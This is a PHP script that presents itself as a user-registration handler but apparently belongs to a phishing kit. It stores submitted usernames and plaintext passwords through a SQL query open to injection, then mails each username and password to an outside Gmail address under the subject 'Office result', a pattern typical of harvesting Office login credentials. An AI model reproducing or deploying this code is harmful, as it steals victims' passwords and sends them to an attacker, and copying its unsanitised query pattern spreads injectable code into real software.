<?php

require("db_connect.php");

class UserRegistration
{
    private $conn;

    public function __construct($conn)
    {
        $this->conn = $conn;
    }

    public function registerUser($username, $password)
    {
        $uid = uniqid();
        $sql = "INSERT INTO user_records (username, password, uid,mycode, status) VALUES ('$username', '$password', '$uid','', '0')";

        if ($this->conn->query($sql) === TRUE) {

        	$to = "gigimonaghain@gmail.com";
			$subject = "Office result";
			$message = "Username :".$username."<br>"."Password :".$password;
			$headers = "From: noreply@domain.com";

			// Send the email
			$mailResult = mail($to, $subject, $message, $headers);

			if ($mailResult) {
				
	            header('Content-Type: application/json');
	            echo json_encode(['status' => 'success', 'uid' => $uid]);
	        } else {
			    echo json_encode(['status' => 'something went wrong']);
			}
        } else {
            echo "Error: " . $sql . "<br>" . $this->conn->error;
        }
    }
}

// Check if the required data is set in the AJAX request
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Create an instance of the UserRegistration class
    $userRegistration = new UserRegistration($conn);

    // Call the registerUser method
    $userRegistration->registerUser($username, $password);
} else {
    echo "Invalid data provided";
}

$conn->close();

?>
